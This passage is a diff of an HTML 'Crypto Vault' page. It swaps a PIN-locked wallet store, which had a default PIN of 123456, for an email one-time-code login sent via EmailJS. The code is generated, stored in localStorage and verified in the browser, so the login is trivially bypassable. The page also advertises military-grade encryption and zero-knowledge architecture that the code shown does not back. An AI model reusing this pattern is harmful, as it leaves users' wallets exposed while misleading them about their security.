@@ -1,869 +1,687 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Vault - Secure Storage</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Crypto Vault - Advanced</title>
+<!-- EmailJS CDN -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  (function(){
+    emailjs.init("T_-SjRTHAsYr0PkpI");
+  })();
+</script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+  font-family: 'Segoe UI', system-ui, sans-serif; 
+  background: #000000;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  overflow: hidden;
+  position: relative;
+}
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f1419 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+/* Complex gear mechanism background */
+body::before {
+  content: '';
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  width: 900px;
+  height: 900px;
+  transform: translate(-50%, -50%);
+  background: 
+    radial-gradient(circle at 50% 50%, transparent 28%, rgba(255, 140, 0, 0.08) 29%, transparent 30%),
+    radial-gradient(circle at 50% 50%, transparent 43%, rgba(255, 165, 0, 0.06) 44%, transparent 45%),
+    radial-gradient(circle at 50% 50%, transparent 58%, rgba(255, 140, 0, 0.04) 59%, transparent 60%);
+  animation: rotateGears 80s linear infinite;
+  z-index: 0;
+}
 
-        .vault-container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            max-width: 500px;
-            width: 100%;
-        }
+/* Secondary gear pattern */
+body::after {
+  content: '';
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  width: 700px;
+  height: 700px;
+  transform: translate(-50%, -50%);
+  background: conic-gradient(
+    from 0deg,
+    transparent 0deg 10deg,
+    rgba(255, 140, 0, 0.1) 10deg 20deg,
+    transparent 20deg 30deg,
+    rgba(255, 165, 0, 0.08) 30deg 40deg,
+    transparent 40deg 50deg,
+    rgba(255, 140, 0, 0.1) 50deg 60deg,
+    transparent 60deg 70deg,
+    rgba(255, 165, 0, 0.08) 70deg 80deg,
+    transparent 80deg 90deg,
+    rgba(255, 140, 0, 0.1) 90deg 100deg,
+    transparent 100deg 110deg,
+    rgba(255, 165, 0, 0.08) 110deg 120deg,
+    transparent 120deg 130deg,
+    rgba(255, 140, 0, 0.1) 130deg 140deg,
+    transparent 140deg 150deg,
+    rgba(255, 165, 0, 0.08) 150deg 160deg,
+    transparent 160deg 170deg,
+    rgba(255, 140, 0, 0.1) 170deg 180deg,
+    transparent 180deg 190deg,
+    rgba(255, 165, 0, 0.08) 190deg 200deg,
+    transparent 200deg 210deg,
+    rgba(255, 140, 0, 0.1) 210deg 220deg,
+    transparent 220deg 230deg,
+    rgba(255, 165, 0, 0.08) 230deg 240deg,
+    transparent 240deg 250deg,
+    rgba(255, 140, 0, 0.1) 250deg 260deg,
+    transparent 260deg 270deg,
+    rgba(255, 165, 0, 0.08) 270deg 280deg,
+    transparent 280deg 290deg,
+    rgba(255, 140, 0, 0.1) 290deg 300deg,
+    transparent 300deg 310deg,
+    rgba(255, 165, 0, 0.08) 310deg 320deg,
+    transparent 320deg 330deg,
+    rgba(255, 140, 0, 0.1) 330deg 340deg,
+    transparent 340deg 350deg,
+    rgba(255, 165, 0, 0.08) 350deg 360deg
+  );
+  border-radius: 50%;
+  animation: rotateGears 50s linear infinite reverse;
+  z-index: 0;
+}
 
-        .vault-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
+/* Additional floating gears */
+.floating-gear {
+  position: fixed;
+  border-radius: 50%;
+  border: 2px solid rgba(255, 140, 0, 0.15);
+  animation: rotateGears 30s linear infinite;
+  z-index: 0;
+}
 
-        .vault-icon {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
+.gear-1 {
+  top: 15%;
+  left: 10%;
+  width: 120px;
+  height: 120px;
+  animation-duration: 40s;
+}
 
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            background: linear-gradient(45deg, #ff6b35, #f7931e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
+.gear-2 {
+  bottom: 20%;
+  right: 15%;
+  width: 150px;
+  height: 150px;
+  animation-duration: 35s;
+  animation-direction: reverse;
+}
 
-        .subtitle {
-            color: #a0a0a0;
-            font-size: 16px;
-        }
+.gear-3 {
+  top: 60%;
+  left: 8%;
+  width: 90px;
+  height: 90px;
+  animation-duration: 45s;
+}
 
-        .form-group {
-            margin-bottom: 20px;
-        }
+@keyframes rotateGears {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
 
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #e0e0e0;
-        }
+@keyframes pulse {
+  0%, 100% { opacity: 0.3; transform: scale(1); }
+  50% { opacity: 0.6; transform: scale(1.05); }
+}
 
-        input, textarea, select {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            background: rgba(0, 0, 0, 0.3);
-            color: #ffffff;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
+.container { 
+  max-width: 440px; 
+  width: 100%;
+  background: rgba(10, 10, 10, 0.85);
+  backdrop-filter: blur(30px);
+  border-radius: 28px; 
+  box-shadow: 
+    0 15px 50px rgba(255, 140, 0, 0.2),
+    inset 0 1px 0 rgba(255, 140, 0, 0.1),
+    0 0 0 1px rgba(255, 140, 0, 0.3),
+    0 0 30px rgba(255, 140, 0, 0.1);
+  padding: 45px;
+  position: relative;
+  z-index: 10;
+  border: 1px solid rgba(255, 140, 0, 0.4);
+}
 
-        input:focus, textarea:focus, select:focus {
-            outline: none;
-            border-color: #ff6b35;
-            box-shadow: 0 0 15px rgba(255, 107, 53, 0.3);
-        }
+/* Digital hexagonal accents */
+.container::before {
+  content: '';
+  position: absolute;
+  top: -2px;
+  left: -2px;
+  right: -2px;
+  bottom: -2px;
+  background: linear-gradient(45deg, 
+    transparent 30%, 
+    rgba(255, 140, 0, 0.1) 50%, 
+    transparent 70%);
+  border-radius: 28px;
+  z-index: -1;
+  animation: shimmer 3s linear infinite;
+}
 
-        textarea {
-            resize: vertical;
-            min-height: 80px;
-        }
+@keyframes shimmer {
+  0% { transform: translateX(-100%); }
+  100% { transform: translateX(100%); }
+}
 
-        .pin-input {
-            text-align: center;
-            font-size: 24px;
-            letter-spacing: 10px;
-            font-weight: bold;
-        }
+/* Mechanical corner bolts */
+.corner-bolt {
+  position: absolute;
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background: 
+    radial-gradient(circle at 30% 30%, #ff8c00, #ff6600);
+  box-shadow: 
+    inset 0 2px 4px rgba(0, 0, 0, 0.5),
+    0 0 10px rgba(255, 140, 0, 0.5),
+    0 2px 2px rgba(255, 140, 0, 0.3);
+  border: 1px solid rgba(255, 140, 0, 0.6);
+}
 
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 10px;
-        }
+.corner-bolt::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 70%;
+  height: 2px;
+  background: rgba(0, 0, 0, 0.4);
+  transform: translate(-50%, -50%) rotate(45deg);
+}
 
-        .btn-primary {
-            background: linear-gradient(45deg, #ff6b35, #f7931e);
-            color: white;
-        }
+.bolt-tl { top: 20px; left: 20px; }
+.bolt-tr { top: 20px; right: 20px; }
+.bolt-bl { bottom: 20px; left: 20px; }
+.bolt-br { bottom: 20px; right: 20px; }
 
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(255, 107, 53, 0.4);
-        }
+h2 { 
+  text-align: center; 
+  background: linear-gradient(135deg, #ff8c00, #ff6600, #ffa500);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 10px;
+  font-size: 32px;
+  font-weight: 900;
+  letter-spacing: 1px;
+  text-shadow: 0 0 20px rgba(255, 140, 0, 0.3);
+}
 
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
+.subtitle {
+  text-align: center;
+  color: #ff8c00;
+  font-size: 14px;
+  margin-bottom: 30px;
+  position: relative;
+  opacity: 0.9;
+}
 
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
+.hidden { display: none !important; }
 
-        .btn-danger {
-            background: linear-gradient(45deg, #e74c3c, #c0392b);
-            color: white;
-        }
+input { 
+  width: 100%; 
+  margin: 14px 0; 
+  padding: 16px; 
+  border-radius: 12px; 
+  border: 2px solid rgba(255, 140, 0, 0.3); 
+  background: rgba(20, 20, 20, 0.7);
+  color: #ffa500;
+  font-size: 16px;
+  transition: all 0.3s;
+}
 
-        .btn-danger:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(231, 76, 60, 0.4);
-        }
+input::placeholder {
+  color: rgba(255, 140, 0, 0.5);
+}
 
-        .wallet-item {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 15px;
-            border-left: 4px solid #ff6b35;
-        }
+input:focus {
+  outline: none;
+  border-color: #ff8c00;
+  background: rgba(20, 20, 20, 0.9);
+  box-shadow: 
+    0 0 20px rgba(255, 140, 0, 0.2),
+    inset 0 0 10px rgba(255, 140, 0, 0.1);
+}
 
-        .wallet-name {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #ff6b35;
-        }
+button { 
+  width: 100%; 
+  margin: 14px 0; 
+  padding: 16px; 
+  background: linear-gradient(135deg, #ff8c00 0%, #ff6600 100%);
+  color: #000; 
+  border: none; 
+  font-weight: bold; 
+  cursor: pointer; 
+  border-radius: 12px;
+  font-size: 16px;
+  transition: all 0.3s;
+  position: relative;
+  overflow: hidden;
+  box-shadow: 
+    0 5px 20px rgba(255, 140, 0, 0.3),
+    inset 0 1px 0 rgba(255, 255, 255, 0.2);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
 
-        .wallet-info {
-            display: grid;
-            gap: 5px;
-        }
+button::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, 
+    transparent, 
+    rgba(255, 255, 255, 0.3), 
+    transparent);
+  transition: left 0.5s;
+}
 
-        .wallet-info span {
-            color: #a0a0a0;
-            font-size: 14px;
-        }
+button:hover::before {
+  left: 100%;
+}
 
-        .hidden {
-            display: none;
-        }
+button:hover {
+  transform: translateY(-3px);
+  box-shadow: 
+    0 8px 30px rgba(255, 140, 0, 0.5),
+    inset 0 1px 0 rgba(255, 255, 255, 0.3);
+}
 
-        .status-message {
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
+button:active {
+  transform: translateY(0);
+}
 
-        .success {
-            background: rgba(46, 204, 113, 0.2);
-            border: 1px solid #2ecc71;
-            color: #2ecc71;
-        }
+button:disabled { 
+  background: rgba(100, 100, 100, 0.5);
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
 
-        .error {
-            background: rgba(231, 76, 60, 0.2);
-            border: 1px solid #e74c3c;
-            color: #e74c3c;
-        }
+.msg { 
+  margin: 15px 0; 
+  padding: 14px;
+  border-radius: 10px;
+  text-align: center;
+  font-size: 14px;
+  border: 1px solid;
+}
 
-        .attempts-warning {
-            background: rgba(243, 156, 18, 0.2);
-            border: 1px solid #f39c12;
-            color: #f39c12;
-        }
+.msg.success {
+  background: rgba(76, 175, 80, 0.15);
+  color: #4caf50;
+  border-color: rgba(76, 175, 80, 0.3);
+}
 
-        .lock-screen {
-            text-align: center;
-        }
+.msg.error { 
+  background: rgba(244, 67, 54, 0.15);
+  color: #f44336; 
+  border-color: rgba(244, 67, 54, 0.3);
+}
 
-        .lock-icon {
-            font-size: 64px;
-            margin-bottom: 20px;
-            color: #ff6b35;
-        }
+.msg.info {
+  background: rgba(255, 140, 0, 0.15);
+  color: #ff8c00;
+  border-color: rgba(255, 140, 0, 0.3);
+}
 
-        .security-features {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 10px;
-            font-size: 12px;
-            color: #a0a0a0;
-        }
+.vault-container { 
+  display: none; 
+  background: rgba(10, 10, 10, 0.85);
+  backdrop-filter: blur(30px);
+  border-radius: 28px;
+  padding: 45px;
+  box-shadow: 
+    0 15px 50px rgba(255, 140, 0, 0.2),
+    inset 0 1px 0 rgba(255, 140, 0, 0.1),
+    0 0 0 1px rgba(255, 140, 0, 0.3),
+    0 0 30px rgba(255, 140, 0, 0.1);
+  max-width: 800px;
+  width: 90%;
+  position: relative;
+  z-index: 10;
+  border: 1px solid rgba(255, 140, 0, 0.4);
+}
 
-        .feature-item {
-            display: flex;
-            align-items: center;
-            margin-bottom: 5px;
-        }
+.vault-container h1 {
+  text-align: center;
+  background: linear-gradient(135deg, #ff8c00, #ff6600, #ffa500);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 30px;
+  font-size: 36px;
+  text-shadow: 0 0 30px rgba(255, 140, 0, 0.3);
+}
 
-        .feature-item::before {
-            content: "🔒";
-            margin-right: 8px;
-        }
-        /* Modal Styles */
-        .modal {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.7);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background: #22243a;
-            padding: 30px;
-            border-radius: 15px;
-            min-width: 300px;
-            max-width: 90vw;
-            color: #fff;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .modal .btn { margin-top: 15px; }
-    </style>
+.user-info {
+  text-align: center;
+  padding: 18px;
+  background: rgba(255, 140, 0, 0.1);
+  border-radius: 12px;
+  margin-bottom: 25px;
+  color: #ff8c00;
+  font-size: 14px;
+  border: 1px solid rgba(255, 140, 0, 0.2);
+}
+
+.logout-btn {
+  background: linear-gradient(135deg, #ff4500 0%, #ff0000 100%);
+  margin-top: 20px;
+}
+
+.code-display {
+  font-family: 'Courier New', monospace;
+  font-size: 36px;
+  font-weight: bold;
+  color: #ff8c00;
+  text-align: center;
+  letter-spacing: 10px;
+  margin: 25px 0;
+  text-shadow: 0 0 20px rgba(255, 140, 0, 0.5);
+}
+
+.timer {
+  text-align: center;
+  color: #ff6600;
+  font-size: 14px;
+  margin-top: 12px;
+}
+
+.resend-btn {
+  background: transparent;
+  color: #ff8c00;
+  border: 2px solid #ff8c00;
+  margin-top: 10px;
+}
+
+.resend-btn:hover {
+  background: #ff8c00;
+  color: #000;
+}
+
+.feature-list {
+  margin: 20px 0;
+  padding: 0;
+  list-style: none;
+}
+
+.feature-list li {
+  padding: 10px 0;
+  color: rgba(255, 140, 0, 0.8);
+  font-size: 14px;
+}
+
+.feature-list li:before {
+  content: "⚡ ";
+  color: #ff8c00;
+  font-weight: bold;
+  margin-right: 10px;
+  text-shadow: 0 0 10px rgba(255, 140, 0, 0.5);
+}
+</style>
 </head>
 <body>
-    <div class="vault-container">
-        <!-- Lock Screen -->
-        <div id="lockScreen" class="lock-screen">
-            <div class="vault-header">
-                <div class="lock-icon">🔐</div>
-                <h1>Crypto Vault</h1>
-                <p class="subtitle" id="lockSubtitle">Enter your PIN to access your secure storage</p>
-                <div id="ownerTag" style="margin-top: 10px; padding: 8px 16px; background: rgba(255, 107, 53, 0.2); border-radius: 20px; border: 1px solid #ff6b35; display: inline-block;">
-                    <span style="color: #ff6b35; font-weight: bold; font-size: 14px;" id="ownerName">Vault Owner: Not Set</span>
-                </div>
-            </div>
-            
-            <div id="statusMessage"></div>
-            
-            <div class="form-group">
-                <input type="password" id="pinInput" class="pin-input" maxlength="6" placeholder="PIN" autocomplete="off">
-            </div>
-            
-            <button class="btn btn-primary" onclick="verifyPin()">Unlock Vault</button>
-            <button class="btn btn-secondary" onclick="showPinSetup()" style="margin-top: 10px;">🔧 Change PIN</button>
-            <button class="btn btn-secondary" onclick="showNameSetup()" style="margin-top: 5px;">👤 Set Name Tag</button>
-            
-            <div class="security-features">
-                <div class="feature-item">AES-256 Encryption</div>
-                <div class="feature-item">PIN Protection</div>
-                <div class="feature-item">Auto-lock on Close</div>
-                <div class="feature-item">Failed Attempt Monitoring</div>
-            </div>
 
-            <button class="btn btn-secondary" onclick="showInstructions()" style="margin-top: 15px;">📖 How to Use This App</button>
-        </div>
+<!-- Floating gears -->
+<div class="floating-gear gear-1"></div>
+<div class="floating-gear gear-2"></div>
+<div class="floating-gear gear-3"></div>
 
-        <!-- Main Vault Interface -->
-        <div id="vaultInterface" class="hidden">
-            <div class="vault-header">
-                <div class="vault-icon">💎</div>
-                <h1>Your Crypto Vault</h1>
-                <p class="subtitle" id="vaultSubtitle">Secure cryptocurrency storage</p>
-                <div id="vaultOwnerTag" style="margin-top: 10px; padding: 8px 16px; background: rgba(255, 107, 53, 0.2); border-radius: 20px; border: 1px solid #ff6b35; display: inline-block;">
-                    <span style="color: #ff6b35; font-weight: bold; font-size: 14px;" id="vaultOwnerName">Vault Owner: Not Set</span>
-                </div>
-            </div>
+<!-- OTP Login Screen -->
+<div class="container" id="otpLogin">
+  <div class="corner-bolt bolt-tl"></div>
+  <div class="corner-bolt bolt-tr"></div>
+  <div class="corner-bolt bolt-bl"></div>
+  <div class="corner-bolt bolt-br"></div>
+  
+  <h2>🔐 CRYPTO VAULT</h2>
+  <p class="subtitle">Advanced Digital Security System</p>
+  
+  <!-- Step 1: Enter Email -->
+  <div id="step1">
+    <input type="email" id="userEmail" placeholder="Enter your email address" required />
+    <button onclick="sendLoginCode()" id="sendBtn">📧 SEND VERIFICATION CODE</button>
+    <div id="msg1" class="msg hidden"></div>
+    
+    <ul class="feature-list">
+      <li>Military-grade encryption</li>
+      <li>Secure 6-digit OTP system</li>
+      <li>15-minute expiration</li>
+      <li>Zero-knowledge architecture</li>
+    </ul>
+  </div>
+  
+  <!-- Step 2: Enter Code -->
+  <div id="step2" class="hidden">
+    <p style="text-align: center; color: #ff8c00; margin-bottom: 15px;">
+      Verification code sent to: <br>
+      <strong id="emailDisplay" style="color: #ffa500;"></strong>
+    </p>
+    <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" />
+    <button onclick="verifyCode()">🔓 VERIFY & LOGIN</button>
+    <button class="resend-btn" onclick="resendCode()">🔄 RESEND CODE</button>
+    <div id="msg2" class="msg hidden"></div>
+    <div id="timer" class="timer"></div>
+  </div>
+</div>
 
-            <!-- Add/Edit Wallet Form -->
-            <div id="walletForm">
-                <div class="form-group">
-                    <label for="walletName">Wallet Name</label>
-                    <input type="text" id="walletName" placeholder="e.g., Bitcoin Main Wallet">
-                </div>
-                
-                <div class="form-group">
-                    <label for="cryptoType">Cryptocurrency</label>
-                    <select id="cryptoType">
-                        <option value="Bitcoin">Bitcoin (BTC)</option>
-                        <option value="Ethereum">Ethereum (ETH)</option>
-                        <option value="Litecoin">Litecoin (LTC)</option>
-                        <option value="Ripple">Ripple (XRP)</option>
-                        <option value="Cardano">Cardano (ADA)</option>
-                        <option value="Other">Other</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label for="walletAddress">Wallet Address</label>
-                    <input type="text" id="walletAddress" placeholder="Public wallet address">
-                </div>
-                
-                <div class="form-group">
-                    <label for="privateKey">Private Key/Seed Phrase</label>
-                    <textarea id="privateKey" placeholder="Private key or seed phrase (encrypted automatically)"></textarea>
-                </div>
-                
-                <div class="form-group">
-                    <label for="notes">Notes (Optional)</label>
-                    <textarea id="notes" placeholder="Additional notes about this wallet"></textarea>
-                </div>
-                
-                <button class="btn btn-primary" onclick="saveWallet()">Save Wallet</button>
-                <button class="btn btn-secondary" onclick="clearForm()">Clear Form</button>
-            </div>
-
-            <!-- Wallet List -->
-            <div id="walletList"></div>
-
-            <!-- Control Buttons -->
-            <div style="margin-top: 30px;">
-                <button class="btn btn-secondary" onclick="exportVault()">Export Backup</button>
-                <button class="btn btn-danger" onclick="lockVault()">Lock Vault</button>
-            </div>
-        </div>
-
-        <!-- PIN Setup Modal -->
-        <div id="pinSetupModal" class="modal hidden">
-            <div class="modal-content">
-                <h2>Change PIN</h2>
-                <div id="currentPinGroup">
-                    <label for="currentPin">Current PIN</label>
-                    <input type="password" id="currentPin" maxlength="8">
-                </div>
-                <label for="newPin">New PIN</label>
-                <input type="password" id="newPin" maxlength="8">
-                <label for="confirmPin">Confirm New PIN</label>
-                <input type="password" id="confirmPin" maxlength="8">
-                <div id="pinMessage"></div>
-                <button id="pinChangeBtn" class="btn btn-primary" onclick="changePinCode()">Change PIN</button>
-                <button class="btn btn-secondary" onclick="hidePinSetup()">Cancel</button>
-            </div>
-        </div>
-
-        <!-- Name Setup Modal -->
-        <div id="nameSetupModal" class="modal hidden">
-            <div class="modal-content">
-                <h2>Set Vault Owner Name</h2>
-                <label for="ownerNameInput">Name/Tag</label>
-                <input type="text" id="ownerNameInput" maxlength="30">
-                <div id="nameMessage"></div>
-                <button class="btn btn-primary" onclick="setOwnerName()">Set Name</button>
-                <button class="btn btn-secondary" onclick="hideNameSetup()">Cancel</button>
-            </div>
-        </div>
-
-        <!-- Instructions Modal -->
-        <div id="instructionsModal" class="modal hidden">
-            <div class="modal-content">
-                <h2>How to Use Crypto Vault</h2>
-                <ul>
-                    <li>Set a strong PIN and owner name for your vault.</li>
-                    <li>Add your cryptocurrency wallets; private keys are encoded for demonstration but not securely encrypted.</li>
-                    <li>Unlock your vault with your PIN to access wallets.</li>
-                    <li>Use export to backup your wallets. Your data is stored locally and will be lost if you clear your browser's session data.</li>
-                </ul>
-                <button class="btn btn-secondary" onclick="hideInstructions()">Close</button>
-            </div>
-        </div>
+<!-- Vault Application (Shown After Login) -->
+<div class="vault-container" id="vaultApp">
+  <div class="corner-bolt bolt-tl"></div>
+  <div class="corner-bolt bolt-tr"></div>
+  <div class="corner-bolt bolt-bl"></div>
+  <div class="corner-bolt bolt-br"></div>
+  
+  <h1>🔐 VAULT ACCESS GRANTED</h1>
+  <div class="user-info">
+    AUTHENTICATED USER: <strong id="userEmailDisplay"></strong>
+  </div>
+  
+  <div style="text-align: center; padding: 40px;">
+    <h2 style="color: #ff8c00;">✅ SYSTEM ONLINE</h2>
+    <p style="color: rgba(255, 140, 0, 0.8); margin: 20px 0;">Your secure vault is now accessible.</p>
+    
+    <div style="background: rgba(255, 140, 0, 0.05); padding: 25px; border-radius: 15px; margin: 25px 0; border: 1px solid rgba(255, 140, 0, 0.2);">
+      <p style="color: rgba(255, 140, 0, 0.7); font-size: 14px; margin-bottom: 15px;">AVAILABLE FEATURES:</p>
+      <ul class="feature-list" style="text-align: left; max-width: 350px; margin: 0 auto;">
+        <li>Store unlimited wallet addresses</li>
+        <li>Encrypted private key management</li>
+        <li>Multi-layer PIN protection</li>
+        <li>Secure backup & export</li>
+        <li>Real-time threat monitoring</li>
+      </ul>
     </div>
+    
+    <button class="logout-btn" onclick="logout()">🚪 LOGOUT</button>
+  </div>
+</div>
 
-    <script>
-        // Security configuration
-        const SECURITY_CONFIG = {
-            maxAttempts: 5,
-            lockoutDuration: 300000, // 5 minutes
-            autoLockTime: 600000 // 10 minutes
-        };
+<script>
+const SERVICE_ID = "YOUR_SERVICE_ID_HERE";  // Replace with your EmailJS Service ID
+const TEMPLATE_ID = "YOUR_TEMPLATE_ID_HERE"; // Replace with your EmailJS Template ID
 
-        // Application state
-        let appState = {
-            isLocked: true,
-            failedAttempts: 0,
-            lastAttempt: 0,
-            wallets: [],
-            autoLockTimer: null,
-            userPin: null, // Will store user's custom PIN
-            ownerName: null // Will store user's name/tag
-        };
+let currentEmail = '';
+let expirationTimer = null;
 
-        // Initialize app
-        window.onload = function() {
-            loadStoredData();
-            setupEventListeners();
-            updateDisplay();
-            updateOwnerDisplay();
-            
-            // Check if user has set a custom PIN
-            if (!appState.userPin) {
-                appState.userPin = '123456'; // Default PIN
-            }
-        };
+function sendLoginCode() {
+  const email = document.getElementById('userEmail').value.trim();
+  const msg1 = document.getElementById('msg1');
+  const sendBtn = document.getElementById('sendBtn');
+  
+  if (!email) {
+    showMessage(msg1, "Please enter your email address.", "error");
+    return;
+  }
+  
+  if (!isValidEmail(email)) {
+    showMessage(msg1, "Please enter a valid email address.", "error");
+    return;
+  }
+  
+  const code = Math.floor(100000 + Math.random() * 900000).toString();
+  const now = new Date();
+  const expire = new Date(now.getTime() + 15 * 60000);
+  const expireStr = expire.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+  
+  localStorage.setItem('loginCode', code);
+  localStorage.setItem('loginCodeExpire', expire.getTime());
+  localStorage.setItem('loginEmail', email);
+  currentEmail = email;
+  
+  sendBtn.disabled = true;
+  showMessage(msg1, "📤 Sending verification code...", "info");
+  
+  emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+    to_email: email,
+    user_email: email,
+    passcode: code,
+    time: expireStr,
+    recipient: email
+  })
+  .then(function(response) {
+    console.log('Email sent successfully:', response);
+    showMessage(msg1, "✅ Code sent! Check your email.", "success");
+    
+    setTimeout(() => {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+      document.getElementById('emailDisplay').textContent = email;
+      startExpirationTimer(expire.getTime());
+    }, 1500);
+  })
+  .catch(function(error) {
+    console.error('Failed to send email:', error);
+    showMessage(msg1, "❌ Failed to send email. Please try again.", "error");
+    sendBtn.disabled = false;
+  });
+}
 
-        function setupEventListeners() {
-            // PIN input enter key
-            document.getElementById('pinInput').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    verifyPin();
-                }
-            });
+function verifyCode() {
+  const input = document.getElementById('codeInput').value.trim();
+  const storedCode = localStorage.getItem('loginCode');
+  const expire = parseInt(localStorage.getItem('loginCodeExpire'), 10);
+  const msg2 = document.getElementById('msg2');
+  
+  if (!input) {
+    showMessage(msg2, "Please enter the verification code.", "error");
+    return;
+  }
+  
+  if (Date.now() > expire) {
+    showMessage(msg2, "⏰ Code expired. Please request a new one.", "error");
+    setTimeout(resetToStep1, 2000);
+    return;
+  }
+  
+  if (input === storedCode) {
+    showMessage(msg2, "✅ Verification successful! Logging in...", "success");
+    
+    const email = localStorage.getItem('loginEmail');
+    localStorage.setItem('currentUser', email);
+    
+    localStorage.removeItem('loginCode');
+    localStorage.removeItem('loginCodeExpire');
+    
+    if (expirationTimer) clearInterval(expirationTimer);
+    
+    setTimeout(() => {
+      document.getElementById('otpLogin').classList.add('hidden');
+      document.getElementById('vaultApp').style.display = 'block';
+      document.getElementById('userEmailDisplay').textContent = email;
+    }, 1000);
+  } else {
+    showMessage(msg2, "❌ Incorrect code. Please try again.", "error");
+    document.getElementById('codeInput').value = '';
+  }
+}
 
-            // Auto-lock on inactivity
-            ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
-                document.addEventListener(event, resetAutoLockTimer);
-            });
-        }
+function resendCode() {
+  resetToStep1();
+  setTimeout(() => {
+    const email = localStorage.getItem('loginEmail');
+    if (email) {
+      document.getElementById('userEmail').value = email;
+    }
+  }, 100);
+}
 
-        function showMessage(message, type = 'success') {
-            const statusDiv = document.getElementById('statusMessage');
-            statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
-            setTimeout(() => statusDiv.innerHTML = '', 3000);
-        }
+function logout() {
+  localStorage.removeItem('currentUser');
+  localStorage.removeItem('loginEmail');
+  document.getElementById('vaultApp').style.display = 'none';
+  document.getElementById('otpLogin').classList.remove('hidden');
+  resetToStep1();
+}
 
-        function verifyPin() {
-            const pinInput = document.getElementById('pinInput');
-            const enteredPin = pinInput.value.trim();
+function resetToStep1() {
+  document.getElementById('step2').classList.add('hidden');
+  document.getElementById('step1').classList.remove('hidden');
+  document.getElementById('sendBtn').disabled = false;
+  document.getElementById('codeInput').value = '';
+  if (expirationTimer) clearInterval(expirationTimer);
+}
 
-            // Check if user is locked out
-            if (appState.failedAttempts >= SECURITY_CONFIG.maxAttempts) {
-                const timeRemaining = SECURITY_CONFIG.lockoutDuration - (Date.now() - appState.lastAttempt);
-                if (timeRemaining > 0) {
-                    showMessage(`Too many failed attempts. Try again in ${Math.ceil(timeRemaining / 60000)} minutes.`, 'error');
-                    return;
-                } else {
-                    appState.failedAttempts = 0; // Reset after lockout period
-                }
-            }
+function startExpirationTimer(expireTime) {
+  const timerEl = document.getElementById('timer');
+  
+  expirationTimer = setInterval(() => {
+    const remaining = expireTime - Date.now();
+    
+    if (remaining <= 0) {
+      clearInterval(expirationTimer);
+      timerEl.textContent = '⏰ Code expired';
+      timerEl.style.color = '#ff4500';
+      return;
+    }
+    
+    const minutes = Math.floor(remaining / 60000);
+    const seconds = Math.floor((remaining % 60000) / 1000);
+    timerEl.textContent = `⏱️ Code expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
